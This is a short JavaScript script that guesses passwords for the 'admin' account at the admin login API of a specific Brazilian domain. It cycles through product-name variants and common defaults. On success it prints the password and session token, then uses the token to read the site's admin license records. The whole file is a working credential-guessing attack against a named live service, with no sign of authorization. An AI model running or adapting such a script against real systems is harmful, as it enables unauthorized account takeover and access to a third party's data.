async function testLogin() {
  const passwordsToTest = [
    'Valora2024SaaS!',
    'Valora2024SaaS',
    'Valora2024',
    'Valora@2024',
    'liveinfinity',
    'liveinfinity2024',
    'liveinfinity!',
    'admin123',
    'admin2024',
    'root',
    'master',
    '12345678',
    'ValoraMod2024!'
  ];

  for (const pass of passwordsToTest) {
    try {
      const res = await fetch('https://api.valoranegocios.com.br/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'admin', password: pass })
      });
      const data = await res.json();
      console.log(`Test "${pass}": Status ${res.status}`, data);
      if (res.status === 200) {
        console.log('✅ SENHA DO ADMIN ENCONTRADA:', pass);
        console.log('✅ TOKEN GERADO:', data.token);

        const licRes = await fetch('https://api.valoranegocios.com.br/api/admin/licenses', {
          headers: { Authorization: `Bearer ${data.token}` }
        });
        const licData = await licRes.json();
        console.log('✅ STATUS LICENÇAS:', licRes.status);
        console.log('✅ QTD LICENÇAS NO BANCO:', licData.licenses?.length);
        break;
      }
    } catch (e) {
      console.error(`Erro ao testar "${pass}":`, e.message);
    }
  }
}

testLogin();
